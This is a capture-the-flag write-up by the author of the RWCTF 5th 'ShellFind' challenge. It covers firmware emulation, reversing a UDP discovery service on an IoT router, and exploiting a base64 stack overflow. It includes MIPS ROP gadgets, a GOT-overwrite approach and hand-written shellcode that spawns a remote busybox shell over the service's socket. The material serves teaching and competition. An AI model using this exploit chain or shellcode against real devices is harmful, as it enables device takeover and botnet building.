# RWCTF 5th ShellFind Write-up

## Background

IoT security has attracted the attention of the security industry and security competitions in recent years. When the vulnerabilities we discover are fixed or hit by the official ahead of time, it may make us feel uncomfortable. Therefore, we must start from the unique attack surface to find vulnerabilities and attack paths. This challenge is to use a certain IoT device that the public is more concerned about to map out a certain non-Web network service as the overall background. Because mapping port is a relatively common vulnerability scenario for debugging vulnerabilities or remote configuration services, it is easy to be exploited by malicious attackers, resulting in the formation of botnets. Related references are as follows:

* [从最近披露的Pink僵尸网络想到的](https://zu1k.com/posts/events/pinkbot/)
* [一个藏在我们身边的巨型僵尸网络 Pink](https://blog.netlab.360.com/pinkbot/)

## Description

The challenge type is `Pwn`, and the difficulty description is `difficulty:Normal`. The specific description is as follows:

```
Hello Hacker.
You don't know me, but I know you.
I want to play a game. Here's what happens if you lose.
The device you are watching is hooked into your Saturday and Sunday.
When the timer in the back goes off,
your curiosity will be permanently ripped open.
Think of it like a reverse bear trap.
Here, I'll show you.
There is only one UDP service to shell the device.
It's in the stomach of your cold firmware.
Look around Hacker. Know that I'm not lying.
Better hurry up.
Shell or out, make your choice.
```

You can directly run the challenge environment locally:

```
sudo docker run --name shellfind -d --privileged -p 4444/udp --rm 1arry/shellfind
```

For the challenge attachment, the original docker environment and the final exploit script, see: <https://github.com/Larryxi/rwctf-5th-shellfind>. Before going deep into the idea of solving the problem, interested ctfers can reverse the firmware to find the target binary, try to exploit the vulnerability within 3 minutes (including 1 minute of environment startup), and obtain an interactive shell.

## Environment setup

The challenge only gives the relevant firmware, which can be easily unpacked by using binwalk. To attack a certain network service, you must know which services the device will start by default. The one-and-done solution is to emulate the firmware. You can search and refer to the more common firmware emulation method: 

* [物联网设备的几种固件仿真方式](http://blog.nsfocus.net/qemu/)
* [物联网终端安全入门与实践之玩转物联网固件（中）](https://www.freebuf.com/articles/endpoint/339782.html)
* [智能设备固件常用仿真方式](https://mp.weixin.qq.com/s/Q2gXMUhaaTvOsFm-TQEjeA)

Generally, they are based on qemu. I use [FirmAE](https://github.com/pr0v3rbs/FirmAE), but the specific environment is not given in the challenge description, because some additional binary in the environment will simplify the way of exploitation. For example, FirmAE will add full-featured busybox, gdbserver and other binaries in the process of building qemu-image:

```bash
echo "----Setting up FIRMADYNE----"
for BINARY_NAME in "${BINARIES[@]}"
do
    BINARY_PATH=`get_binary ${BINARY_NAME} ${ARCH}`
    cp "${BINARY_PATH}" "${IMAGE_DIR}/firmadyne/${BINARY_NAME}"
    chmod a+x "${IMAGE_DIR}/firmadyne/${BINARY_NAME}"
done
```

I used [firmadyne](https://github.com/firmadyne/firmadyne/) to emulate the firmware at first, but there is no way to infer the network information of the device from the startup process of the firmware. You can also manually build the device network by referring to the following article :

* [Linux虚拟网络设备之veth](https://segmentfault.com/a/1190000009251098?utm_source=sf-similar-article)
* [Linux虚拟网络设备之tun/tap](https://segmentfault.com/a/1190000009249039)
* [Linux虚拟网络设备之bridge(桥)](https://segmentfault.com/a/1190000009491002?utm_source=sf-similar-article)
* [Setting up Qemu with a tap interface](https://gist.github.com/extremecoders-re/e8fd8a67a515fee0c873dcafc81d811c)

Obviously, FirmAE can successfully infer the network environment and use tap to emulate network devices, but the host is not added to  the bridge with tap, which created the restriction that the challenge doesn't allow outbound connection.

```bash
TAPDEV_0=tap${IID}_0
HOSTNETDEV_0=${TAPDEV_0}
echo "Creating TAP device ${TAPDEV_0}..."
sudo tunctl -t ${TAPDEV_0} -u ${USER}


echo "Bringing up TAP device..."
sudo ip link set ${HOSTNETDEV_0} up
sudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0}


echo -n "Starting emulation of firmware... "
 ${QEMU} ${QEMU_BOOT} -m 1024 -M ${QEMU_MACHINE} -kernel ${KERNEL} \
    -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 FIRMAE_NET=${FIRMAE_NET} FIRMAE_NVRAM=${FIRMAE_NVRAM} FIRMAE_KERNEL=${FIRMAE_KERNEL} FIRMAE_ETC=${FIRMAE_ETC} ${QEMU_DEBUG}" \
    -serial file:${WORK_DIR}/qemu.final.serial.log \
    -serial unix:/tmp/qemu.${IID}.S1,server,nowait \
    -monitor unix:/tmp/qemu.${IID},server,nowait \
    -display none \
    -device e1000,netdev=net0 -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net1 -netdev socket,id=net1,listen=:2001 -device e1000,netdev=net2 -netdev socket,id=net2,listen=:2002 -device e1000,netdev=net3 -netdev socket,id=net3,listen=:2003 | true


echo "Bringing down TAP device..."
sudo ip link set ${TAPDEV_0} down


echo "Deleting TAP device ${TAPDEV_0}..."
sudo tunctl -d ${TAPDEV_0}


echo "Done!"
```

## Root cause

The challenge does not specify which port corresponds to the target service, but after emulating the firmware, we could exclude the 80 tcp service firstly, and the rest work is reverse engineering and positioning.

```
# /firmadyne/busybox netstat -lnp
/firmadyne/busybox netstat -lnp
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 :::31338                :::*                    LISTEN      911/busybox
tcp        0      0 :::80                   :::*                    LISTEN      761/httpd
udp        0      0 0.0.0.0:62976           0.0.0.0:*                           889/ddp
udp        0      0 0.0.0.0:62720           0.0.0.0:*                           765/ipfind
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
```

When reversing the `ipfind` binary, I found that the overall logic is simple. After the UDP service receives the data, `sub_40172C` or `sub_4013F4` function is called according to the data structure, and you could convert the v15 into a character array, which looks better:

```c
                  v6 = server_sockfd;
                  v14.__fds_bits[(unsigned int)server_sockfd >> 5] |= 1 << server_sockfd;
                  if ( select(v6 + 1, &v14, 0, 0, 0) >= 0 )
                  {
                    if ( ((v14.__fds_bits[(unsigned int)server_sockfd >> 5] >> server_sockfd) & 1) != 0 )
                    {
                      v11 = 16;
                      memset(v15, 0, sizeof(v15));
                      recvfrom(server_sockfd, v15, 0x800u, 0, (struct sockaddr *)&client_addr, addr_len);
                      *(_DWORD *)&v15[4] = (*(_DWORD *)&v15[4] << 24) | (unsigned __int8)v15[4] | ((*(_DWORD *)&v15[4] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[4] & 0xFF00) << 8);
                      v7 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[9]) << 8) | ((unsigned int)((unsigned __int8)v15[10] | ((unsigned __int8)v15[9] << 8)) >> 8));
                      *(_WORD *)&v15[9] = v7;
                      *(_WORD *)&v15[11] = (_byteswap_ushort(*(unsigned __int16 *)&v15[11]) << 8) | ((unsigned int)((unsigned __int8)v15[12] | ((unsigned __int8)v15[11] << 8)) >> 8);
                      v8 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[23]) << 8) | ((unsigned int)((unsigned __int8)v15[24] | ((unsigned __int8)v15[23] << 8)) >> 8));
                      *(_WORD *)&v15[23] = v8;
                      v17 = (*(_DWORD *)&v15[25] << 24) | (unsigned __int8)v15[25] | ((*(_DWORD *)&v15[25] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[25] & 0xFF00) << 8);
                      *(_DWORD *)&v15[25] = v17;
                      if ( !strncmp(v18, v20, 4u) && v15[8] == 10 )
                      {
                        if ( v7 == 1 )
                        {
                          if ( !v8 && !memcmp(v21, v23, 6u) && !v17 )
                            sub_40172C((int)v15);
                        }
                        else if ( v7 == 2
                               && net_get_hwaddr(ifname, v22) >= 0
                               && !memcmp(v21, v22, 6u)
                               && *(_DWORD *)&v15[25] == 0x8E )
                        {
                          sub_4013F4((int)v15);
                        }
                      }
                    }
                  }
```

If you don’t know the mac address of the target device, you will enter `sub_40172C` to obtain the basic information of the device, and then broadcast it in the LAN. In order to bring the vulnerability to the WAN side, I deliberately patch the binary so that it can be sent back to the client, as one of the hints for the target program. Of course, you can also use qemu's default mac address for subsequent exploitation, so I don't need to patch. BTW, after the patch procedure, I use [firmware-mod-kit](https://github.com/rampageX/firmware-mod-kit) to repack the firmware.

```c
  v9[75] = v9[75] & 0xFF0000FF | ((unsigned __int16)(((_WORD)v7 << 8) | BYTE2(v7)) << 8);
  v3 = inet_ntoa((struct in_addr)dword_413174);
  dword_413174 = inet_addr("255.255.255.255");
  if ( sendto(server_sockfd, v9, 0x21Du, 0, (const struct sockaddr *)&client_addr, 0x10u) < 0 )
    v4 = "Failed";
  else
    v4 = "Success";
  return s_log_nothing("from %s: Discovery %s.\n", v3, v4);
```

After entering the `sub_400F50` function within `sub_4013F4`, the obvious vulnerability is that the base64 decoding goes directly to the stack without length limit, causing buffer overflow:

```c
int __fastcall sub_400F50(int a1, int a2)
{
  int v4; // $s1
  int v5; // $s0
  char v7[256]; // [sp+18h] [-344h] BYREF
  char v8[256]; // [sp+118h] [-244h] BYREF
  char v9[256]; // [sp+218h] [-144h] BYREF
  char v10; // [sp+318h] [-44h] BYREF
  char v11[63]; // [sp+319h] [-43h] BYREF

  v10 = 0;
  memset(v11, 0, sizeof(v11));
  Base64decs(a1, v7);
  Base64decs(a2, v8);
  cfgRead("USER_ADMIN", "Username1", &v10);
  usrInit(0);
  v4 = usrGetGroup(v7);
  v5 = usrGetPass(v7, v9, 256);
  if ( v5 == 1 )
  {
    if ( !v4 && !strcmp(&v10, v7) )
      v5 = strcmp(v8, v9) != 0;
  }
  else
  {
    v5 = -1;
  }
  usrFree();
  return v5;
}
```

## Exploit

After `checksec`, the program found that the security compilation options were not enabled, but [mipsrop](https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop) did not give a valid output, which means we have to construct rop by yourself. At the same time, ASLR in the qemu system is also one of the limitations of the challenge.

```
$ checksec /mnt/hgfs/rwctf/iot/firmware/ipfind
[*] You have the latest version of Pwntools (4.8.0)
[*] '/mnt/hgfs/rwctf/iot/firmware/ipfind'
    Arch:     mips-32-big
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### Write GOT

If PIE is not enabled, we should check to see if there are any gadgets that can be used in the .text section, we cloud notice a gadget written in 4 bytes:

```
.text:00400F24 8F A2 00 18                 lw      $v0, 0x20+var_8($sp)
.text:00400F28 AE 02 00 0D                 sw      $v0, 0xD($s0)
.text:00400F2C
.text:00400F2C             loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j
.text:00400F2C 8F 82 80 68                 la      $v0, ifname
.text:00400F30 8C 44 00 00                 lw      $a0, (ifname - 0x413138)($v0)
.text:00400F34 8F 99 80 8C                 la      $t9, net_get_hwaddr
.text:00400F38 03 20 F8 09                 jalr    $t9 ; net_get_hwaddr
.text:00400F3C 26 05 00 11                 addiu   $a1, $s0, 0x11
.text:00400F40 8F BF 00 24                 lw      $ra, 0x20+var_s4($sp)
.text:00400F44 8F B0 00 20                 lw      $s0, 0x20+var_s0($sp)
.text:00400F48 03 E0 00 08                 jr      $ra
.text:00400F4C 27 BD 00 28                 addiu   $sp, 0x28
```

`$s0` is controllable at the overflow point, which is equivalent to writing at any address. We can write a custom command and then jump to the system, or modify the GOT table and jump. We choose the latter one. Interested ctfers can try the first one. In the process of constructing the subsequent rop chain, you will find the first error place. The reason is that IDA has done some work for us, so that the `$gp` register is not considered in place:

```
.text:00400F34 8F 99 80 8C                 la      $t9, net_get_hwaddr
8F 99 80 8C    lw $t9, -0x7f74($gp)
```

So we should restore the `$gp` register firstly, you can also search it in the results of ROPgadget:

```
0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
```

Finally, just find a gadget that `$a0` points to the bottom of the stack, such as `memset`, after modifying the GOT, you can execute any command:

```
.text:00401768 27 A4 00 21                 addiu   $a0, $sp, 0x35C+var_33B  # s
.text:0040176C 00 00 28 21                 move    $a1, $zero       # c
.text:00401770 8F 99 80 78                 la      $t9, memset
.text:00401774 03 20 F8 09                 jalr    $t9 ; memset
.text:00401778 24 06 00 FF                 li      $a2, 0xFF        # n
```

But how to get the flag through a single command, the target environment is not connected to the Internet, which means that the reverse shell cannot be used, the udp port must be reused. First of all, I would like to know whether the target environment has something like nc. If it happens to be a FirmAE environment, then you could use busybox in the `/firmadyne/` directory to start a udp_bind_shell directly. Unfortunately, the nc of busybox was changed to nx by me, I don’t know if you can guess it.

```
.rodata:0057401F                 .byte 0x6E  # n
.rodata:00574020                 .byte 0x78  # x
.rodata:00574021                 .byte    0
.rodata:00574022                 .byte 0x6E  # n
.rodata:00574023                 .byte 0x65  # e
.rodata:00574024                 .byte 0x74  # t
.rodata:00574025                 .byte 0x73  # s
.rodata:00574026                 .byte 0x74  # t
.rodata:00574027                 .byte 0x61  # a
.rodata:00574028                 .byte 0x74  # t
.rodata:00574029                 .byte    0
```

If not, let’s `echo` to send out a binary. Due to the length of the initial recvfrom, the buffer overflow padding, and the expansion of the base64 encoding, a command can only contain a few hundred characters. I am too lazy to compile, generate and streamline the binary, so it would be great if the command can be executed multiple times, we can restart the vulnerability service after exploiting the vulnerability:

```python
        bof_payload += cmd
        if restart == True:
            bof_payload += "rm /var/run/ipfind-br0.pid;ipfind br0 &\x00"
        else:
            bof_payload += "\x00"
```

But restarting the vulnerable service multiple times will cause it to inherit multiple fds. If your binary is relatively large, inexplicable bugs will appear when you finally listen to the same port. It is recommended to close the original `server_sockfd` at first:

```
.text:004021E8 8F BC 00 10                 lw      $gp, 0x98+var_88($sp)
.text:004021EC 8F 82 80 B8                 la      $v0, server_sockfd
.text:004021F0 8C 44 00 00                 lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
.text:004021F4 8F 99 80 38                 la      $t9, close
.text:004021F8 03 20 F8 09                 jalr    $t9 ; close
.text:004021FC 00 00 00 00                 nop
.text:00402200 8F BF 00 9C                 lw      $ra, 0x98+var_s4($sp)
.text:00402204 8F B0 00 98                 lw      $s0, 0x98+var_s0($sp)
.text:00402208 03 E0 00 08                 jr      $ra
.text:0040220C 27 BD 00 A0                 addiu   $sp, 0xA0
```

### ret2shellcode

If you don’t want to execute so many commands, and the stack is executable, the quickest way is `ret2shellcode`, you can find such gadget in the .text section:

```
.text:004013D0             s_log_nothing:                           # CODE XREF: sub_4013F4+9C↓p
.text:004013D0                                                      # sub_4013F4+160↓p ...
.text:004013D0
.text:004013D0             var_8           = -8
.text:004013D0             arg_4           =  4
.text:004013D0             arg_8           =  8
.text:004013D0             arg_C           =  0xC
.text:004013D0
.text:004013D0 27 BD FF F0                 addiu   $sp, -0x10
.text:004013D4 AF A5 00 14                 sw      $a1, 0x10+arg_4($sp)
.text:004013D8 AF A6 00 18                 sw      $a2, 0x10+arg_8($sp)
.text:004013DC AF A7 00 1C                 sw      $a3, 0x10+arg_C($sp)
.text:004013E0 27 A2 00 14                 addiu   $v0, $sp, 0x10+arg_4
.text:004013E4 AF A2 00 08                 sw      $v0, 0x10+var_8($sp)
.text:004013E8 27 BD 00 10                 addiu   $sp, 0x10
.text:004013EC 03 E0 00 08                 jr      $ra
.text:004013F0 00 00 00 00                 nop
```

Among them, `addiu $v0, $sp, 0x10+arg_4` typed out the stack address, and we could search for gadget within the cross-introduction of the `s_log_nothing` function, which does not affect `$v0` and quickly overwrites `$ra`, for example :

```
.text:00401F98 0C 10 04 F4                 jal     s_log_nothing
.text:00401F9C 24 84 2C F8                 li      $a0, aCanTGetHelloSo  # "Can't get hello socket\n"
.text:00401FA0 10 00 00 44                 b       loc_4020B4

.text:004020B4 8F BF 00 84                 lw      $ra, 0x7C+var_s8($sp)
.text:004020B8 8F B1 00 80                 lw      $s1, 0x7C+var_s4($sp)
.text:004020BC 8F B0 00 7C                 lw      $s0, 0x7C+var_s0($sp)
.text:004020C0 03 E0 00 08                 jr      $ra
.text:004020C4 27 BD 00 88                 addiu   $sp, 0x88
```

The value written at any address above happens to be `$v0`, so we can jump after another load. Carefully observe the end of the function in the program, we can find such a gadget just meets our needs:

```
.text:004027C0 03 20 F8 09                 jalr    $t9
.text:004027C4 00 00 00 00                 nop
.text:004027C8
.text:004027C8             loc_4027C8:                              # CODE XREF: sub_402790+28↑j
.text:004027C8 8E 19 00 00                 lw      $t9, 0($s0)
.text:004027CC 17 31 FF FC                 bne     $t9, $s1, loc_4027C0
.text:004027D0 26 10 FF FC                 addiu   $s0, -4
.text:004027D4 8F BF 00 24                 lw      $ra, 0x1C+var_s8($sp)
.text:004027D8 8F B1 00 20                 lw      $s1, 0x1C+var_s4($sp)
.text:004027DC 8F B0 00 1C                 lw      $s0, 0x1C+var_s0($sp)
.text:004027E0 03 E0 00 08                 jr      $ra
.text:004027E4 27 BD 00 28                 addiu   $sp, 0x28
```

Before the actual jump to the stack address, `$a1`, `$a2` and `$a3` will be written to the stack at 0x004013D4 of the gadget. It needs to be combined to ensure that these three values ​​are nop instructions. If it affects the normal execution of the rop chain, it still needs to be customized at the very beginning, such as "clearing" `$a3` (it will become 0x0, 0x0, 0x1 after `close`):

```
.text:004020A0 00 00 38 21                 move    $a3, $zero       # flags
.text:004020A4 8F BC 00 18                 lw      $gp, 0x7C+var_64($sp)
.text:004020A8 8F 99 80 38                 la      $t9, close
.text:004020AC 03 20 F8 09                 jalr    $t9 ; close
.text:004020B0 02 00 20 21                 move    $a0, $s0         # fd
.text:004020B4
.text:004020B4             loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j
.text:004020B4                                                      # sub_401DF4+238↑j ...
.text:004020B4 8F BF 00 84                 lw      $ra, 0x7C+var_s8($sp)
.text:004020B8 8F B1 00 80                 lw      $s1, 0x7C+var_s4($sp)
.text:004020BC 8F B0 00 7C                 lw      $s0, 0x7C+var_s0($sp)
.text:004020C0 03 E0 00 08                 jr      $ra
.text:004020C4 27 BD 00 88                 addiu   $sp, 0x88
```

Finally we jump to the shellcode, we need to realize the function of udp_bind_shell, there is not ready-made in msf, we can only look at the [code]( https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c#L595) of [nc](https://www.sqlsec.com/2019/10/nc.html). When we use `nc -l -p 62720 -u -e /bin /sh`,  it firstly `recvfrom` to obtain the client address and then connect back:

```c
			} else if (uflag && !kflag) {
				/*
				 * For UDP and not -k, we will use recvfrom()
				 * initially to wait for a caller, then use
				 * the regular functions to talk to the caller.
				 */
				int rv;
				char buf[2048];
				struct sockaddr_storage z;

				len = sizeof(z);
				rv = recvfrom(s, buf, sizeof(buf), MSG_PEEK,
				    (struct sockaddr *)&z, &len);
				if (rv == -1)
					err(1, "recvfrom");

				rv = connect(s, (struct sockaddr *)&z, len);
				if (rv == -1)
					err(1, "connect");

				if (family == AF_UNIX) {
					if (pledge("stdio unix", NULL) == -1)
						err(1, "pledge");
				}
				if (vflag)
					report_sock("Connection received",
					    (struct sockaddr *)&z, len,
					    family == AF_UNIX ? host : NULL);

				readwrite(s, NULL);
```

Because `recvfrom` has been called when the vulnerability was triggered by the first interaction, with the help of the existing [connect back shellcode](https://shell-storm.org/shellcode/files/shellcode-794.html), it's done by `execve` busybox after `dup2`. We should pay attention to the [format](https://www.anquanke.com/post/id/180252#h3-11) delivered to busybox. So one shot to getshell:

```python
        bof_payload += "\x3C\x1C\x00\x42"        # lui   $gp, 0x42
        bof_payload += "\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
        bof_payload += "\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
        bof_payload += "\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
        bof_payload += "\x8F\x85\x80\xF4"        # lw $a1, -0x7f0c($gp)
        bof_payload += "\x24\x0c\xff\xef"        # li      t4,-17 ( addrlen = 16 )     
        bof_payload += "\x01\x80\x30\x27"        # nor     a2,t4,zero 
        bof_payload += "\x24\x02\x10\x4a"        # li      v0,4170 ( sys_connect ) 
        bof_payload += "\x01\x01\x01\x0c"        # syscall 0x40404

        bof_payload += "\x3C\x1C\x00\x42"        # lui   $gp, 0x42
        bof_payload += "\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
        bof_payload += "\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
        bof_payload += "\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd  

        bof_payload += "\x24\x0f\xff\xfd"        # li      t7,-3
        bof_payload += "\x01\xe0\x28\x27"        # nor     a1,t7,zero
        # bof_payload += "\x8f\xa4\xff\xff"        # lw      a0,-1(sp)
        bof_payload += "\x24\x02\x0f\xdf"        # li      v0,4063 ( sys_dup2 )
        bof_payload += "\x01\x01\x01\x0c"        # syscall 0x40404
        bof_payload += "\x20\xa5\xff\xff"        # addi    a1,a1,-1
        bof_payload += "\x24\x01\xff\xff"        # li      at,-1
        bof_payload += "\x14\xa1\xff\xfb"        # bne     a1,at, dup2_loop

        # execve /bin/busybox sh
        bof_payload += "\x28\x06\xFF\xFF"        # slti    $a2, $zero, -1
        bof_payload += "\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
        bof_payload += "\x35\xEF\x69\x6E"        # ori     $t7, $t7, 0x696e
        bof_payload += "\xAF\xAF\xFF\xDC"        # sw      $t7, -0x24($sp)
        bof_payload += "\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
        bof_payload += "\x35\xEF\x75\x73"        # ori     $t7, $t7, 0x7573
        bof_payload += "\xAF\xAF\xFF\xE0"        # sw      $t7, -0x20($sp)
        bof_payload += "\x3C\x0F\x79\x62"        # lui     $t7, 0x7962
        bof_payload += "\x35\xEF\x6F\x78"        # ori     $t7, $t7, 0x6f78
        bof_payload += "\xAF\xAF\xFF\xE4"        # sw      $t7, -0x1c($sp)
        bof_payload += "\xAF\xA0\xFF\xE8"        # sw      $zero, -0x18($sp)
        bof_payload += "\x3C\x0F\x73\x68"        # lui     $t7, 0x7368
        bof_payload += "\xAF\xAF\xFF\xEC"        # sw      $t7, -0x14($sp)
        bof_payload += "\xAF\xA0\xFF\xF0"        # sw      $zero, -0x10($sp)
        bof_payload += "\x27\xAF\xFF\xDC"        # addiu   $t7, $sp, -0x24
        bof_payload += "\xAF\xAF\xFF\xF4"        # sw      $t7, -0xc($sp)
        bof_payload += "\x27\xAF\xFF\xEC"        # addiu   $t7, $sp, -0x14
        bof_payload += "\xAF\xAF\xFF\xF8"        # sw      $t7, -8($sp)
        bof_payload += "\xAF\xA0\xFF\xFC"        # sw      $zero, -4($sp)
        bof_payload += "\x27\xA4\xFF\xDC"        # addiu   $a0, $sp, -0x24
        bof_payload += "\x27\xA5\xFF\xF8"        # addiu   $a1, $sp, -8
        bof_payload += "\x24\x02\x0F\xAB"        # addiu   $v0, $zero, 0xfab
        bof_payload += "\x01\x01\x01\x0C"        # syscall 0x40404
```

# Summary

1. According to the way of building the challenge, there are three ways to find the target binary: 1. It is found that the program has been patched during the reverse process; 2. Repacking the firmware will leave traces of access time; 3. Use the firmware emulation method to discover the network services that are started by default. It should be counted as one of the basic qualities of IoT offensive and defensive personnel.
2. The reverse engineering and vulnerability in the challenge are not difficult, but it is necessary for the contestants to dynamically send packets and interact with the network program in the early stage to determine the target binary, which may be the same as fingerprint scanning.
3. It seems impossible to obtain an interactive shell based on a single vulnerability in a simple program, but in the end we cannot just refer to the output given to us by the auxiliary program in the process of exploiting the vulnerability, we must investigate its essence and let everything in the program be used by us . In addition, this exploit can also directly return to the gadget near `sendto` to complete information leak, but it requires multiple interactions, which is the same as the shellcode that directly lists the directory, I personally think that some noise may be added.
4. I am very grateful to Chaitin Technology for giving me the opportunity to explore security offensive and defensive technologies in this Real World CTF 5th. I also thank all the hackers and ctfers for their hard work in this competition. I hope this article can inspire you and me. Hack all the way.

Chinese version: <https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ>

